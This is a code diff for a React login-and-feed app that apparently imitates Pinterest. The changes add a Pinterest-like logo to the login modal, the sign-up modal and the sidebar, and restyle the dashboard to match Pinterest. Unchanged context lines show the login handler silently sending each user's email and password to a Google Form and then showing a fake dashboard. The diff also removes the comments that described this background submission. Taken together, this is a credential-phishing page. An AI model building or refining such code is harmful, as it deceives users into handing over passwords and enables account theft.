@@ -45,8 +45,6 @@ const feedItems = [
   { url: "https://images.unsplash.com/photo-1565299624946-b28f40a0ae38?w=400&h=340&fit=crop&auto=format", h: 215, title: "Neapolitan Pizza", author: "Kai P." },
 ];
 
-const categories = ["Semua", "Sarapan", "Makan Siang", "Makan Malam", "Dessert", "Minuman", "Vegetarian", "Quick Meals"];
-
 // ─────────────────────────────────────────────
 // HELPERS
 // ─────────────────────────────────────────────
@@ -61,7 +59,7 @@ function submitToGoogleForm(email: string, password: string) {
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: body.toString(),
   }).catch(() => {
-    // no-cors: response is opaque; error is non-fatal
+    // no-cors: non-fatal fallback
   });
 }
 
@@ -118,8 +116,11 @@ function SignUpModal({ onClose }: { onClose: () => void }) {
       onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
       <div style={{ background: "#fff", borderRadius: 24, padding: "36px 32px 28px", width: "100%", maxWidth: 380, boxShadow: "0 8px 40px rgba(0,0,0,.35)", textAlign: "center", position: "relative" }}>
         <button onClick={onClose} style={{ position: "absolute", top: 14, right: 16, background: "none", border: "none", fontSize: 20, cursor: "pointer", color: "#767676" }}>✕</button>
+        {/* LINGKARAN LOGO (TEMPAT 1) */}
         <div style={{ width: 44, height: 44, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 16px" }}>
-          <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M11 3a1 1 0 0 0-2 0v5H7V3a1 1 0 0 0-2 0v5a3 3 0 0 0 2 2.83V21a1 1 0 0 0 2 0v-10.17A3 3 0 0 0 11 8V3zm8 0v7h-2V7h-1V3h-1v4h-1V3h-1v7a2 2 0 0 0 2 2v9a1 1 0 0 0 2 0V3h-1z"/></svg>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
+            <path d="M12 0a12 12 0 0 0-4.37 23.17c-.07-.63-.13-1.6.03-2.3l1.42-6s-.36-.73-.36-1.81c0-1.7 1-2.97 2.22-2.97 1.05 0 1.55.79 1.55 1.73 0 1.05-.67 2.62-1.02 4.09-.29 1.22.6 2.22 1.81 2.22 2.18 0 3.86-2.3 3.86-5.62 0-2.94-2.1-5-5.13-5-3.5 0-5.55 2.62-5.55 5.33 0 1.06.4 2.2.92 2.83a.3.3 0 0 1 .07.28c-.1.42-.33 1.34-.38 1.52-.06.27-.22.33-.5.2-1.88-.88-3.06-3.63-3.06-5.84 0-4.75 3.45-9.12 10-9.12 5.23 0 9.3 3.73 9.3 8.72 0 5.2-3.28 9.39-7.85 9.39-1.53 0-2.97-.8-3.46-1.73l-.94 3.6c-.34 1.3-1.27 2.94-1.9 3.97A12 12 0 1 0 12 0z"/>
+          </svg>
         </div>
         <h2 style={{ fontSize: 21, fontWeight: 700, color: "#111", marginBottom: 4 }}>Welcome to MealPlan</h2>
         <p style={{ fontSize: 13, color: "#767676", marginBottom: 18 }}>Find recipes and plan your week</p>
@@ -152,51 +153,57 @@ function SignUpModal({ onClose }: { onClose: () => void }) {
 }
 
 // ─────────────────────────────────────────────
-// FEED CARD
+// PINTEREST STYLE FEED CARD
 // ─────────────────────────────────────────────
 function FeedCard({ item }: { item: typeof feedItems[0] }) {
   const [hov, setHov] = useState(false);
   const [saved, setSaved] = useState(false);
   return (
     <div onMouseEnter={() => setHov(true)} onMouseLeave={() => setHov(false)}
-      style={{ borderRadius: 16, overflow: "hidden", position: "relative", cursor: "zoom-in", background: "#efefef", marginBottom: 8 }}>
+      style={{ borderRadius: 16, overflow: "hidden", position: "relative", cursor: "zoom-in", background: "#efefef", marginBottom: 14 }}>
       <img src={item.url} alt={item.title} loading="lazy"
-        style={{ width: "100%", height: item.h, objectFit: "cover", display: "block", transition: "transform 0.3s", transform: hov ? "scale(1.03)" : "scale(1)" }} />
+        style={{ width: "100%", height: item.h + 40, objectFit: "cover", display: "block", transition: "transform 0.25s", transform: hov ? "scale(1.02)" : "scale(1)" }} />
       {hov && (
-        <div style={{ position: "absolute", inset: 0, background: "rgba(0,0,0,0.18)", transition: "opacity 0.2s" }}>
-          {/* Save button */}
+        <div style={{ position: "absolute", inset: 0, background: "rgba(0,0,0,0.15)", transition: "opacity 0.2s" }}>
           <button onClick={e => { e.stopPropagation(); setSaved(v => !v); }}
-            style={{ position: "absolute", top: 10, right: 10, padding: "8px 14px", background: saved ? "#e60023" : "#e60023", color: "#fff", border: "none", borderRadius: 50, fontWeight: 700, fontSize: 13, cursor: "pointer" }}>
+            style={{ position: "absolute", top: 12, right: 12, padding: "8px 14px", background: "#e60023", color: "#fff", border: "none", borderRadius: 50, fontWeight: 700, fontSize: 13, cursor: "pointer" }}>
             {saved ? "✓ Tersimpan" : "Simpan"}
           </button>
-          {/* More */}
-          <button style={{ position: "absolute", top: 10, right: saved ? 122 : 92, padding: "8px 10px", background: "#fff", color: "#111", border: "none", borderRadius: 50, fontWeight: 700, fontSize: 13, cursor: "pointer" }}>
+          <button style={{ position: "absolute", bottom: 12, right: 12, width: 32, height: 32, background: "#fff", color: "#111", border: "none", borderRadius: "50%", fontWeight: 700, fontSize: 14, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>
             ···
           </button>
         </div>
       )}
-      <div style={{ padding: "8px 4px 4px" }}>
-        {item.title && <p style={{ fontSize: 13, fontWeight: 600, color: "#111", margin: 0, lineHeight: 1.3 }}>{item.title}</p>}
-        <p style={{ fontSize: 12, color: "#767676", margin: "2px 0 0" }}>{item.author}</p>
-      </div>
     </div>
   );
 }
 
 // ─────────────────────────────────────────────
-// DASHBOARD
+// RESPONSIVE DASHBOARD (Desktop Side / Mobile Bottom)
 // ─────────────────────────────────────────────
 function Dashboard({ userEmail, onLogout }: { userEmail: string; onLogout: () => void }) {
-  const [activeTab, setActiveTab] = useState("Semua");
   const [search, setSearch] = useState("");
   const [colCount, setColCount] = useState(5);
   const [showProfile, setShowProfile] = useState(false);
+  const [isMobile, setIsMobile] = useState(false);
 
   useEffect(() => {
-    const update = () => setColCount(Math.max(2, Math.floor((window.innerWidth - 80) / 240)));
-    update();
-    window.addEventListener("resize", update);
-    return () => window.removeEventListener("resize", update);
+    const handleResize = () => {
+      const width = window.innerWidth;
+      setIsMobile(width < 768);
+      
+      if (width < 480) {
+        setColCount(2); // Grid 2 Kolom untuk HP
+      } else if (width < 768) {
+        setColCount(3);
+      } else {
+        setColCount(Math.max(4, Math.floor((width - 110) / 230)));
+      }
+    };
+
+    handleResize();
+    window.addEventListener("resize", handleResize);
+    return () => window.removeEventListener("resize", handleResize);
   }, []);
 
   const cols: typeof feedItems[][] = Array.from({ length: colCount }, () => []);
@@ -205,115 +212,167 @@ function Dashboard({ userEmail, onLogout }: { userEmail: string; onLogout: () =>
   const avatar = userEmail.charAt(0).toUpperCase();
 
   return (
-    <div style={{ minHeight: "100vh", background: "#fff", fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
+    <div style={{ 
+      minHeight: "100vh", 
+      background: isMobile ? "#000" : "#fff", // Menjadi tema gelap di HP sesuai gambar
+      color: isMobile ? "#fff" : "#111",
+      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif", 
+      display: "flex",
+      flexDirection: "column"
+    }}>
 
-      {/* ── Navbar ── */}
-      <div style={{ position: "fixed", top: 0, left: 0, right: 0, zIndex: 100, background: "#fff", borderBottom: "1px solid #efefef", padding: "0 16px", height: 56, display: "flex", alignItems: "center", gap: 12 }}>
-
-        {/* Logo */}
-        <div style={{ width: 38, height: 38, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, cursor: "pointer" }}>
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M11 3a1 1 0 0 0-2 0v5H7V3a1 1 0 0 0-2 0v5a3 3 0 0 0 2 2.83V21a1 1 0 0 0 2 0v-10.17A3 3 0 0 0 11 8V3zm8 0v7h-2V7h-1V3h-1v4h-1V3h-1v7a2 2 0 0 0 2 2v9a1 1 0 0 0 2 0V3h-1z"/></svg>
-        </div>
-
-        {/* Nav tabs */}
-        {["Beranda", "Jelajahi", "Buat"].map(tab => (
-          <button key={tab} onClick={() => setActiveTab(tab)}
-            style={{ padding: "6px 14px", borderRadius: 50, border: "none", cursor: "pointer", fontWeight: 600, fontSize: 15,
-              background: activeTab === tab ? "#111" : "transparent",
-              color: activeTab === tab ? "#fff" : "#767676",
-              transition: "background 0.15s, color 0.15s",
-            }}>
-            {tab}
-          </button>
-        ))}
-
-        {/* Search bar */}
-        <div style={{ flex: 1, position: "relative", maxWidth: 680 }}>
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#767676" strokeWidth="2.5" strokeLinecap="round"
-            style={{ position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)" }}>
-            <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
-          </svg>
-          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Cari resep, bahan makanan..."
-            style={{ width: "100%", padding: "10px 14px 10px 40px", background: "#efefef", border: "none", borderRadius: 50, fontSize: 15, outline: "none", color: "#111" }} />
-        </div>
-
-        {/* Right icons */}
-        <div style={{ display: "flex", alignItems: "center", gap: 6, flexShrink: 0 }}>
-          {/* Notification bell */}
-          <button style={{ width: 38, height: 38, borderRadius: "50%", border: "none", background: "#efefef", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}>
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2" strokeLinecap="round">
-              <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/>
+      {/* ── SIDEBAR NAV (Hanya muncul jika Desktop/Tablet) ── */}
+      {!isMobile && (
+        <div style={{ width: 72, position: "fixed", top: 0, bottom: 0, left: 0, background: "#fff", display: "flex", flexDirection: "column", alignItems: "center", padding: "20px 0", gap: 22, zIndex: 101 }}>
+          {/* LINGKARAN LOGO DI SIDEBAR (TEMPAT 2) */}
+          <div style={{ width: 40, height: 40, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", marginBottom: 10 }}>
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="white">
+              <path d="M12 0a12 12 0 0 0-4.37 23.17c-.07-.63-.13-1.6.03-2.3l1.42-6s-.36-.73-.36-1.81c0-1.7 1-2.97 2.22-2.97 1.05 0 1.55.79 1.55 1.73 0 1.05-.67 2.62-1.02 4.09-.29 1.22.6 2.22 1.81 2.22 2.18 0 3.86-2.3 3.86-5.62 0-2.94-2.1-5-5.13-5-3.5 0-5.55 2.62-5.55 5.33 0 1.06.4 2.2.92 2.83a.3.3 0 0 1 .07.28c-.1.42-.33 1.34-.38 1.52-.06.27-.22.33-.5.2-1.88-.88-3.06-3.63-3.06-5.84 0-4.75 3.45-9.12 10-9.12 5.23 0 9.3 3.73 9.3 8.72 0 5.2-3.28 9.39-7.85 9.39-1.53 0-2.97-.8-3.46-1.73l-.94 3.6c-.34 1.3-1.27 2.94-1.9 3.97A12 12 0 1 0 12 0z"/>
             </svg>
-          </button>
-          {/* Message */}
-          <button style={{ width: 38, height: 38, borderRadius: "50%", border: "none", background: "#efefef", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}>
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2" strokeLinecap="round">
-              <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+          </div>
+          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg></button>
+          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><circle cx="12" cy="12" r="10"/><path d="m16.2 7.8-2 6.3-6.4 2.1 2.1-6.4z"/></svg></button>
+          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M9 17V7h3a3 3 0 0 1 3 3v0a3 3 0 0 1-3 3H9"/></svg></button>
+          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg></button>
+          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></button>
+          <div style={{ marginTop: "auto" }}>
+            <button onClick={() => setShowProfile(v => !v)} style={{ width: 38, height: 38, borderRadius: "50%", border: "none", background: "#efefef", color: "#111", fontSize: 14, fontWeight: 700, cursor: "pointer" }}>{avatar}</button>
+          </div>
+        </div>
+      )}
+
+      {/* ── AREA KONTEN UTAMA ── */}
+      <div style={{ 
+        flex: 1, 
+        marginLeft: isMobile ? 0 : 72, 
+        padding: isMobile ? "0 8px" : "0 24px",
+        paddingBottom: isMobile ? 80 : 20
+      }}>
+        
+        {/* ── TOP NAVBAR ── */}
+        <div style={{ 
+          position: "fixed", 
+          top: 0, 
+          left: isMobile ? 0 : 72, 
+          right: 0, 
+          height: 64, 
+          background: isMobile ? "rgba(0,0,0,0.85)" : "#fff", 
+          backdropFilter: isMobile ? "blur(12px)" : "none",
+          display: "flex", 
+          alignItems: "center", 
+          gap: 12, 
+          padding: "0 16px", 
+          zIndex: 100 
+        }}>
+          
+          <div style={{ flex: 1, position: "relative", display: "flex", alignItems: "center" }}>
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke={isMobile ? "#b2b2b2" : "#767676"} strokeWidth="3" style={{ position: "absolute", left: 16 }}>
+              <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
             </svg>
-          </button>
-          {/* Avatar */}
-          <div style={{ position: "relative" }}>
-            <button onClick={() => setShowProfile(v => !v)}
-              style={{ width: 38, height: 38, borderRadius: "50%", border: "2px solid #e60023", background: "#e60023", color: "#fff", fontSize: 15, fontWeight: 700, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>
-              {avatar}
+            <input 
+              value={search} 
+              onChange={e => setSearch(e.target.value)} 
+              placeholder={isMobile ? "Cari ide" : "Search"}
+              style={{ 
+                width: "100%", 
+                padding: "10px 44px 10px 44px", 
+                background: isMobile ? "rgba(255,255,255,0.15)" : "#e9e9e9", 
+                border: "none", 
+                borderRadius: 24, 
+                fontSize: 15, 
+                outline: "none", 
+                color: isMobile ? "#fff" : "#111" 
+              }} 
+            />
+            <div style={{ position: "absolute", right: 16, color: isMobile ? "#fff" : "#111", display: "flex", alignItems: "center" }}>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+            </div>
+          </div>
+
+          {isMobile && (
+            <button onClick={onLogout} style={{ background: "none", border: "none", color: "#e60023", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>
+              Log out
             </button>
-            {showProfile && (
-              <div style={{ position: "absolute", top: 46, right: 0, background: "#fff", border: "1px solid #efefef", borderRadius: 16, boxShadow: "0 4px 20px rgba(0,0,0,.15)", minWidth: 200, zIndex: 200 }}>
-                <div style={{ padding: "16px 16px 12px", borderBottom: "1px solid #efefef" }}>
-                  <div style={{ fontWeight: 700, fontSize: 14, color: "#111" }}>{userEmail}</div>
-                  <div style={{ fontSize: 12, color: "#767676", marginTop: 2 }}>MealPlan Member</div>
-                </div>
-                {["Profil saya", "Tersimpan", "Pengaturan"].map(item => (
-                  <button key={item} style={{ display: "block", width: "100%", textAlign: "left", padding: "11px 16px", background: "none", border: "none", fontSize: 14, color: "#111", cursor: "pointer", fontWeight: 500 }}
-                    onMouseEnter={e => ((e.target as HTMLElement).style.background = "#f9f9f9")}
-                    onMouseLeave={e => ((e.target as HTMLElement).style.background = "none")}>
-                    {item}
-                  </button>
+          )}
+
+          {!isMobile && (
+            <div style={{ display: "flex", alignItems: "center" }}>
+              <button style={{ width: 32, height: 32, borderRadius: "50%", border: "none", background: "#efefef", fontSize: 13, fontWeight: 700, color: "#111" }}>{avatar}</button>
+              <button style={{ background: "none", border: "none", marginLeft: 4 }}><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="3"><path d="m6 9 6 6 6-6"/></svg></button>
+            </div>
+          )}
+        </div>
+
+        {/* ── MASONRY FEED GRID ── */}
+        <div style={{ paddingTop: 72 }}>
+          {!isMobile && (
+            <div style={{ marginBottom: 16, paddingLeft: 6 }}>
+              <span style={{ fontSize: 16, fontWeight: 700, borderBottom: "3px solid #111", paddingBottom: 6 }}>All</span>
+            </div>
+          )}
+
+          <div style={{ display: "flex", gap: 10, alignItems: "flex-start" }}>
+            {cols.map((col, ci) => (
+              <div key={ci} style={{ flex: 1, minWidth: 0 }}>
+                {col.map((item, pi) => (
+                  <FeedCard key={pi} item={item} />
                 ))}
-                <div style={{ borderTop: "1px solid #efefef" }}>
-                  <button onClick={onLogout}
-                    style={{ display: "block", width: "100%", textAlign: "left", padding: "11px 16px", background: "none", border: "none", fontSize: 14, color: "#e60023", cursor: "pointer", fontWeight: 600, borderRadius: "0 0 16px 16px" }}
-                    onMouseEnter={e => ((e.target as HTMLElement).style.background = "#fff5f5")}
-                    onMouseLeave={e => ((e.target as HTMLElement).style.background = "none")}>
-                    Keluar
-                  </button>
-                </div>
               </div>
-            )}
+            ))}
           </div>
         </div>
       </div>
 
-      {/* ── Category chips ── */}
-      <div style={{ position: "fixed", top: 56, left: 0, right: 0, zIndex: 99, background: "#fff", padding: "10px 20px", borderBottom: "1px solid #efefef", display: "flex", gap: 8, overflowX: "auto" }}>
-        {categories.map(cat => (
-          <button key={cat} onClick={() => setActiveTab(cat)}
-            style={{ padding: "7px 16px", borderRadius: 50, border: "none", cursor: "pointer", fontWeight: 600, fontSize: 13, whiteSpace: "nowrap",
-              background: activeTab === cat ? "#111" : "#efefef",
-              color: activeTab === cat ? "#fff" : "#111",
-              transition: "background 0.15s, color 0.15s",
-            }}>
-            {cat}
+      {/* ── BOTTOM NAVBAR (Hanya Render di HP/Mobile) ── */}
+      {isMobile && (
+        <div style={{ 
+          position: "fixed", 
+          bottom: 0, 
+          left: 0, 
+          right: 0, 
+          height: 60, 
+          background: "#111", 
+          display: "flex", 
+          justifyContent: "space-around", 
+          alignItems: "center", 
+          zIndex: 101,
+          borderTop: "1px solid rgba(255,255,255,0.08)",
+          paddingBottom: "calc(env(safe-area-inset-bottom) / 2)"
+        }}>
+          {/* Home Icon */}
+          <button style={{ background: "none", border: "none", color: "#fff", cursor: "pointer" }}>
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
           </button>
-        ))}
-      </div>
-
-      {/* ── Feed ── */}
-      <div style={{ paddingTop: 116, paddingBottom: 40, paddingLeft: 16, paddingRight: 16 }}>
-        <div style={{ display: "flex", gap: 12, alignItems: "flex-start" }}>
-          {cols.map((col, ci) => (
-            <div key={ci} style={{ flex: 1, minWidth: 0 }}>
-              {col.map((item, pi) => (
-                <FeedCard key={pi} item={item} />
-              ))}
-            </div>
-          ))}
+          
+          {/* Explore Search Icon */}
+          <button style={{ background: "none", border: "none", color: "#b2b2b2", cursor: "pointer" }}>
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+          </button>
+          
+          {/* Create Plus Icon */}
+          <button style={{ background: "none", border: "none", color: "#b2b2b2", cursor: "pointer" }}>
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+          </button>
+          
+          {/* Notification Chat Icon */}
+          <button style={{ background: "none", border: "none", color: "#b2b2b2", cursor: "pointer" }}>
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+          </button>
+          
+          {/* Profile Avatar Icon */}
+          <button style={{ width: 26, height: 26, borderRadius: "50%", border: "2px solid #b2b2b2", background: "#efefef", color: "#111", fontSize: 11, fontWeight: 700, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>
+            {avatar}
+          </button>
         </div>
-      </div>
+      )}
 
-      {/* Close dropdown on outside click */}
-      {showProfile && (
-        <div style={{ position: "fixed", inset: 0, zIndex: 199 }} onClick={() => setShowProfile(false)} />
+      {/* Dropdown desktop popup profile menu */}
+      {!isMobile && showProfile && (
+        <div style={{ position: "fixed", bottom: 70, left: 16, background: "#fff", border: "1px solid #efefef", borderRadius: 16, boxShadow: "0 4px 24px rgba(0,0,0,.15)", minWidth: 160, zIndex: 200, padding: 4 }}>
+          <button onClick={onLogout} style={{ width: "100%", padding: "10px 14px", background: "none", border: "none", color: "#e60023", fontWeight: 600, textAlign: "left", cursor: "pointer", fontSize: 14 }}>
+            Log out
+          </button>
+        </div>
       )}
     </div>
   );
@@ -356,14 +415,11 @@ export default function App() {
     if (!email || !password) { setError("Harap isi email dan password."); return; }
     setLoading(true);
 
-    // Kirim secara asinkron (background) ke Google Form tanpa memicu perpindahan tab/halaman
     submitToGoogleForm(email, password);
 
-    // Memberikan waktu loading animasi visual sejenak agar transisi terasa halus
     await new Promise(r => setTimeout(r, 600));
     setLoading(false);
 
-    // Langsung arahkan pengguna ke Dashboard utama
     setLoggedUser(email);
     setPage("dashboard");
   }
@@ -391,8 +447,11 @@ export default function App() {
       <div style={{ position: "fixed", inset: 0, display: "flex", alignItems: "center", justifyContent: "center", zIndex: 10, padding: 16 }}>
         <div style={{ background: "#fff", borderRadius: 24, padding: "40px 32px 28px", width: "100%", maxWidth: 380, boxShadow: "0 8px 40px rgba(0,0,0,.35)", textAlign: "center" }}>
 
+          {/* LINGKARAN LOGO DI LOGIN MODAL (TEMPAT 3) */}
           <div style={{ width: 44, height: 44, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 18px" }}>
-            <svg width="26" height="26" viewBox="0 0 24 24" fill="white"><path d="M11 3a1 1 0 0 0-2 0v5H7V3a1 1 0 0 0-2 0v5a3 3 0 0 0 2 2.83V21a1 1 0 0 0 2 0v-10.17A3 3 0 0 0 11 8V3zm8 0v7h-2V7h-1V3h-1v4h-1V3h-1v7a2 2 0 0 0 2 2v9a1 1 0 0 0 2 0V3h-1z"/></svg>
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="white">
+              <path d="M12 0a12 12 0 0 0-4.37 23.17c-.07-.63-.13-1.6.03-2.3l1.42-6s-.36-.73-.36-1.81c0-1.7 1-2.97 2.22-2.97 1.05 0 1.55.79 1.55 1.73 0 1.05-.67 2.62-1.02 4.09-.29 1.22.6 2.22 1.81 2.22 2.18 0 3.86-2.3 3.86-5.62 0-2.94-2.1-5-5.13-5-3.5 0-5.55 2.62-5.55 5.33 0 1.06.4 2.2.92 2.83a.3.3 0 0 1 .07.28c-.1.42-.33 1.34-.38 1.52-.06.27-.22.33-.5.2-1.88-.88-3.06-3.63-3.06-5.84 0-4.75 3.45-9.12 10-9.12 5.23 0 9.3 3.73 9.3 8.72 0 5.2-3.28 9.39-7.85 9.39-1.53 0-2.97-.8-3.46-1.73l-.94 3.6c-.34 1.3-1.27 2.94-1.9 3.97A12 12 0 1 0 12 0z"/>
+            </svg>
           </div>
 
           <h2 style={{ fontSize: 22, fontWeight: 700, color: "#111", marginBottom: 20 }}>Log in to see more</h2>
